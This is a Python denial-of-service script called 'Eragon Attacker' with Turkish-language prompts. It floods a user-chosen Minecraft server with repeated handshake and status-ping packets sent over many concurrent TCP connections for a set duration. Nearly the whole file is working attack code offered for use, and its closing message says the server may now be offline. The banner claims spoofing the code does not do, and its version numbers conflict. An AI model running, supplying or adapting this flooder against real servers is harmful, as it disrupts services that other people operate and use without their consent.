# -*- coding: utf-8 -*-
# Eragon Attacker v1.0 - Advanced Minecraft Server Flood Tool
# Pydroid 3 Compatible | Multi-Threaded | High Performance

from colorama import init, Fore, Back, Style
import threading
import socket
import random
import time
import os
import sys

init(autoreset=True)

# Logo
def print_logo():
    logo = f"""
{Fore.RED}{Style.BRIGHT}
 ███████╗██████╗  █████╗  ██████╗  ██████╗ ███╗   ██╗
 ██╔════╝██╔══██╗██╔══██╗██╔════╝ ██╔═══██╗████╗  ██║
 █████╗  ██████╔╝███████║██║  ███╗██║   ██║██╔██╗ ██║
 ██╔══╝  ██╔══██╗██╔══██║██║   ██║██║   ██║██║╚██╗██║
 ███████╗██║  ██║██║  ██║╚██████╔╝╚██████╔╝██║ ╚████║
 ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═══╝
{Fore.YELLOW}{Style.BRIGHT}          Advanced Minecraft Server Attacker v9.0
{Fore.CYAN}        Threaded • Spoofed • Unstoppable • Pydroid 3 Ready
{Style.RESET_ALL}
    """
    print(logo)

# Configuration
print_logo()
target = input(f"{Fore.CYAN}[?] Hedef IP: {Style.RESET_ALL}")
port = int(input(f"{Fore.CYAN}[?] Port (genelde 25565): {Style.RESET_ALL}"))
threads = int(input(f"{Fore.CYAN}[?] Thread Sayısı (100-5000): {Style.RESET_ALL}"))
duration = int(input(f"{Fore.CYAN}[?] Saldırı Süresi (saniye): {Style.RESET_ALL}"))

# Minecraft handshake packet
def minecraft_handshake():
    hostname = target.encode()
    packet = bytearray()
    packet.append(0x00)  # Packet ID
    packet.append(0x04)  # Protocol version (1.8-1.20 uyumlu)
    packet += len(hostname).to_bytes(1, 'big')
    packet += hostname
    packet += port.to_bytes(2, 'big')
    packet.append(0x01)  # Next state: status
    return len(packet).to_bytes(1, 'big') + packet

# Attack function
def attack_thread():
    payload = minecraft_handshake() + b'\x01\x00'  # Ping packet
    end_time = time.time() + duration
    
    while time.time() < end_time:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            s.connect((target, port))
            
            for _ in range(50):  # High intensity
                s.send(payload)
            
            s.close()
            print(f"{Fore.GREEN}[+] Flood gönderildi → {target}:{port}{Style.RESET_ALL}")
        except:
            print(f"{Fore.RED}[-] Bağlantı hatası, yeniden deneniyor...{Style.RESET_ALL}")
            time.sleep(0.1)

# Start attack
print(f"\n{Fore.MAGENTA}[!] Saldırı başlatılıyor...{Style.RESET_ALL}")
time.sleep(2)

for i in range(threads):
    t = threading.Thread(target=attack_thread)
    t.daemon = True
    t.start()

print(f"{Fore.YELLOW}[*] {threads} thread aktif. {duration} saniye boyunca sunucu bombalanıyor...{Style.RESET_ALL}")

try:
    time.sleep(duration + 2)
except KeyboardInterrupt:
    print(f"\n{Fore.RED}[!] Saldırı durduruldu.{Style.RESET_ALL}")

print(f"{Fore.CYAN}[✓] Eragon Attacker görevi tamamladı. Sunucu offline olabilir.{Style.RESET_ALL}")